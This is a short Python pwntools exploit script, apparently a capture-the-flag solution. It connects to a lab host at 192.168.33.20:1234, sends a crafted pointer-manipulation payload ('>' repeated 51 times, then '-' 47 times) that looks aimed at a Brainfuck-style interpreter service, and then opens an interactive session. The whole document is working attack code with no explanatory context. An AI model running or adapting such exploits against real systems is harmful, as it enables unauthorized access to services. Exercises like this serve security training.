from pwn import *
rhp = {'host': '192.168.33.20', 'port':1234}

conn = remote(rhp['host'], rhp['port'])

res = conn.recv()
log.info(res)
payload = ">" * 51 + "-" * 47

conn.sendline(payload)
conn.interactive()
